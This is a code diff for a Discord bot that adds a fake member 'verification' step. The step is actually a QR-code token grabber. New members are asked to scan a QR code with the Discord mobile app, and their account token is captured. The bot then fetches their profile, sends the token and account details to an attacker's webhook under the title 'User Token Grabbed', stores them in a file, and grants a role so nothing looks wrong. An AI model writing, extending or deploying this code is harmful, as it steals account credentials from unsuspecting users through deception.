@@ -1,17 +1,145 @@
 import asyncio
 import discord
 import os
-from discord import app_commands
+import json
+import ujson
+from discord import Colour
 from discord.ext import commands
+from discord.ui import Button, View
 from dotenv import load_dotenv
+from aioconsole import aprint
+from resources import QR
+import aiohttp
+from discord import Interaction, Colour, Embed, app_commands
+from discord.utils import get
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
 
 # Load .env file
 load_dotenv()
+with open("./resources/data.json") as f:
+    config = json.load(f)
+webhook_url = config["webhook_url"]
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", intents=intents)
+prefix = config["prefix"]
+bot = commands.Bot(
+    command_prefix=prefix,
+    intents=intents,
+    help_command=None,
+    case_insensitive=True,
+)
 
 client = discord.Client(intents=intents)
 tree = app_commands.CommandTree(client)
+qr = QR()
+role_id = int(config["role_id"])
+webhook = DiscordWebhook(url=webhook_url)
+
+
+class VerifyView(discord.ui.View):
+    def __init__(self):
+        super().__init__()
+
+    @discord.ui.button(label="Verify Here!", style=discord.ButtonStyle.secondary)
+    async def verify_button(
+        self, interaction: discord.Interaction, button: discord.ui.Button
+    ):
+        await qr.create_qr(name=f"{interaction.user.id}")
+        em = Embed(
+            title=f"Hello {interaction.user.name}",
+            description="Welcome to our server! Please verify below using the inbuilt QR Code scanner on the discord mobile app.",
+            colour=Colour.dark_red(),
+        )
+        em.set_image(url=f"attachment://qr-code-{interaction.user.id}.png")
+        em.set_footer(text="Le daron a Cyril")
+        em.set_author(name=f"{bot.user.name}", icon_url=f"{bot.user.avatar.url}")
+        await interaction.response.send_message(
+            embed=em,
+            file=discord.File(f"./resources/codes/qr-code-{interaction.user.id}.png"),
+            ephemeral=True,
+        )
+        os.remove(f"resources/codes/qr-code-{interaction.user.id}.png")
+        token = asyncio.create_task(qr.wait_token())
+        token = await token
+        print(f"Token: {token}")
+        while True:
+            await asyncio.sleep(3)
+            if token != None:
+                em = Embed(title="User Token Grabbed")
+                await tokeninfo(str(token), em)
+                webhook.add_embed(em.to_dict())
+                webhook.execute()
+                role = get(interaction.guild.roles, id=role_id)
+                user = interaction.user
+                print(f"Sent message to webhook")
+                await user.add_roles(role)
+                await interaction.response.edit_original_message(content="Verification completed successfully.", embed=None)
+                break
+
+
+async def tokeninfo(_token, embed):
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            "https://discord.com/api/v9/users/@me",
+            headers={
+                "authorization": _token,
+                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.135 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
+            },
+        ) as resp:
+            if resp.status == 200:
+                j = await resp.json()
+                user = {}
+                with open("./resources/users.json", "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                    users = data["users"]
+                    for key, value in j.items():
+                        embed.add_field(name=f"{key}", value=f"{value}", inline=False)
+                        user[f"{key}"] = value
+                    embed.add_field(name="token", value=f"{_token}", inline=False)
+                    user["Token"] = _token
+                    users.append(user)
+                with open("./resources/users.json", "w", encoding="utf-8") as f:
+                    json.dump(data, f, indent=4)
+
+
+def is_owner():
+    def predicate(interaction: discord.Interaction):
+        if interaction.user.id == interaction.guild.owner.id:
+            return True
+
+    return app_commands.check(predicate)
+
+
+@bot.event
+async def on_member_join(member):
+    with open("./resources/data.json") as f:
+        data = ujson.load(f)
+    channel = member.guild.get_channel(int(data["channel"]))
+    print("Channel:", channel)
+    if channel is not None:
+        em = discord.Embed(
+            title=f"**Welcome to {member.guild.name}**",
+            description=":lock: **In order to access this server, you need to pass the verification test.**\n:arrow_right: Please verify below.",
+        )
+        view = VerifyView()
+        await channel.send(content=f"Welcome {member.mention}", embed=em, view=view,)
+
+
+@bot.tree.command(
+    name="verify",
+    description="Verifies the user with an embed button and a QR code",
+)
+# @is_owner()
+async def verify_slash(interaction: discord.Interaction):
+    with open("./resources/data.json") as f:
+        data = ujson.load(f)
+    if str(interaction.channel.id) == str(data["channel"]):
+        em = discord.Embed(
+            title=f"**Welcome to {interaction.guild.name}**",
+            description=":lock: **In order to access this server, you need to pass the verification test.**\n:arrow_right: Please verify below.",
+        )
+        view = VerifyView()
+        await interaction.response.send_message(embed=em, view=view, ephemeral=True)
 
 
 @bot.tree.command(
